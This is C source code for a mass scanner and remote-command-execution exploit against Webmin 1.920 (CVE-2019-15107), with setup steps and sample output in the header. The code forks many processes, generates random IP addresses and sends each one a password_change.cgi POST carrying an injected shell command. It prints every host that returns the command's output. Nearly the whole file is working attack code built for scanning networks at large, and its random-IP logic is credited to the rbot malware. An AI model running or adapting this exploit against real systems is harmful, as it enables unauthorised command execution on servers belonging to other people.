/////////////////////////////////////////////////////////////////////////////////////////////
// Webmin 1.920 Remote Code Execution Exploit Scanner CVE_2019_15107-muBoTwebmin_1.920cut.c muBoT Cut
// by BoSSaLiNiE
//
// Step 1
// wget https://netix.dl.sourceforge.net/project/webadmin/webmin/1.920/webmin_1.920_all.deb
//
// Step 2
// dpkg -i webmin_1.920_all.deb
//
//
// Step 3
// sed -i s/passwd_mode=0/passwd_mode=2/g /etc/webmin/miniserv.conf;service webmin restart
//
// Step 4
// gcc CVE_2019_15107-muBoTwebmin_1.920cut.c -o CVE_2019_15107-Scanner -lcurl
// 
// 
// ~# ./CVE_2019_15107-Scanner 10.0.0.* 50
//
// [RANDOMSCAN STARTED]SUBNET[ 10.0.0.* ]THREADS[ 50 ]
// https://10.0.0.14:10000/password_change.cgi
//  01:18:18 up  6:44,  0 users,  load average: 0.00, 0.00, 0.00
//
// https://10.0.0.14:10000/password_change.cgi
//  01:18:18 up  6:44,  0 users,  load average: 0.00, 0.00, 0.00
//
///////////////////////////////////////////////////////////////////////////////////////////////


#include <assert.h>
#include <stdio.h>
#include <curl/curl.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/time.h>
#include <signal.h>
#include <netdb.h>
#include <math.h>
#include <sys/wait.h>
#include <stdarg.h>
#include <errno.h>
#include <sys/stat.h>
#include <strings.h>
#include <sys/select.h>
#include <sys/utsname.h>
#include <ifaddrs.h>
#include <netinet/ip.h>
#include <sys/sysinfo.h>

int maxchilds = 0;

unsigned long childs=0,sek=0,pid=0;

int CVE_2019_15107(char *ip){

	CURLU *h;
	CURL *curl;
	CURLcode res;
	struct sockaddr_in servaddr;  /*  socket address structure  */ 
	curl_socket_t sockfd;

	char buffer[200];
	char scanip[20];
	char *host;
	char *path;
	char ref[100];
	char url[100];


	struct string {
		char *ptr;
		size_t len;
	};

	void init_string(struct string *s) {
		s->len = 0;
		s->ptr = malloc(s->len+1);
		if (s->ptr == NULL) {
			fprintf(stderr, "malloc() failed\n");
			exit(EXIT_FAILURE);
		}
		s->ptr[0] = '\0';
	}

	size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s)
	{
		size_t new_len = s->len + size*nmemb;
		s->ptr = realloc(s->ptr, new_len+1);
		if (s->ptr == NULL) {
			fprintf(stderr, "realloc() failed\n");
			exit(EXIT_FAILURE);
		}
		memcpy(s->ptr+s->len, ptr, size*nmemb);
		s->ptr[new_len] = '\0';
		s->len = new_len;

		return size*nmemb;
	}


	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();

	if(curl) {
		/* what call to write: */ 
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
		struct curl_slist *headers=NULL;


		struct string s;
		init_string(&s);

		headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate");
		headers = curl_slist_append(headers, "Accept: */*");
		headers = curl_slist_append(headers, "Accept-Language: en");
		headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)");
		headers = curl_slist_append(headers, "Connection: close");
		headers = curl_slist_append(headers, "Cookie: redirect=1; testing=1; sid=x; sessiontest=1");
		//	headers = curl_slist_append(headers, "Referer: https://192.168.233.134:10000/session_login.cgi");      
		headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");
		headers = curl_slist_append(headers, "Content-Lenght: 60");
		headers = curl_slist_append(headers, "cache-control: no-cache");

		sprintf(url, "https://%s:10000/password_change.cgi", ip);
		sprintf(ref, "https://%s:10000/session_login.cgi", ip);

		curl_easy_setopt(curl, CURLOPT_REFERER, ref);
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers );
		curl_easy_setopt(curl, CURLOPT_VERBOSE, 0);
		curl_easy_setopt(curl, CURLOPT_URL, url);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);

		char b64str[100000] = {0};
		sprintf(b64str, "user=rootxx&pam=&expired=2&old=uptime&new1=test2&new2=test2");

		curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, b64str);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);
		//  curl_easy_setopt (curl, CURLOPT_TIMEOUT, 10L);

		res = curl_easy_perform(curl);

		//////////////////////////FILTER//////////////////////////

		//  puts(s.ptr);
		const char *x = s.ptr;
		const char *PATTERN1 = "<center><h3>Failed to change password : The current password is incorrect";
		const char *PATTERN2 = "</h3></center>";

		char *target = NULL;
		char *start, *end;

		if ( start = strstr( x, PATTERN1 ) )
		{
			start += strlen( PATTERN1 );
			if ( end = strstr( start, PATTERN2 ) )
			{
				target = ( char * )malloc( end - start + 1 );
				memcpy( target, start, end - start );
				target[end - start] = '\0';
			}
		}

		if ( target ) 
			puts(url);
		puts( target );

		free( target );

		free(s.ptr);


	}
	return 0;
}


int main(int argc,char* argv[]){
	int running = 0;
	char *temp;
	char *ip_ptr;
	int a,b,c,d;
	char ip[20];
	unsigned long secs;
	time_t start=time(NULL);
	int maxchilds=100,status,pgid;
	char *subnet = NULL;
	int sub =0;
	pid_t pid;



	temp=argv[1];
	maxchilds=atoi(argv[2]);

	printf("[RANDOMSCAN STARTED]SUBNET[ %s ]THREADS[ %s ]\n",argv[1],argv[2]);
	pid = fork();

	running = 1;

	if (running) {
		while (1) 
		{

			//////////////////RIPPED by rbot thx nils//////////////////////
			int ip1,ip2,ip3,ip4;

			ip1=-1;ip2=-1;ip3=-1;ip4=-1;

			sscanf(temp,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);

			if (ip1==-1) ip1=rand()%255;
			if (ip2==-1) ip2=rand()%255;
			if (ip3==-1) ip3=rand()%255;
			if (ip4==-1) ip4=rand()%255;
			///////////////////////////////////////////////////////////////
			//printf("NOTICE %s : ip:%d.%d.%d.%d \n",ip1,ip2,ip3,ip4);
			if (childs >= maxchilds) wait(NULL);
			(void) sprintf(ip, "%i.%i.%i.%i",ip1,ip2,ip3,ip4);

			switch(fork()) {
				case 0:
					CVE_2019_15107(ip);
				case -1:
					exit(1);
				default:
					++childs;
					break;
			}
		}
	}
}
